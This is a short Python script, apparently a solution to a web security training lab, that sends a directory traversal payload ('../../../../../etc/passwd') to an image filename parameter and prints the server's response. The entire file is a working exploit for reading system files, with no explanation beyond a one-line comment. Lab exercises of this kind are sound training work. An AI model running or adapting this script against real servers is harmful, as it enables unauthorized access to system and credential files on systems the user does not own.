#!/usr/bin/python3

import requests

def dt_image(url, api):

    # No filder around directory traversal
    payload = "../../../../../etc/passwd"

    r = requests.get(url + api + payload)
    print(r.text)
    
if __name__ == '__main__':
    url = "https://ac481f6c1f19d64fc0e837490046005c.web-security-academy.net"
    api = "/image?filename="

    dt_image(url, api)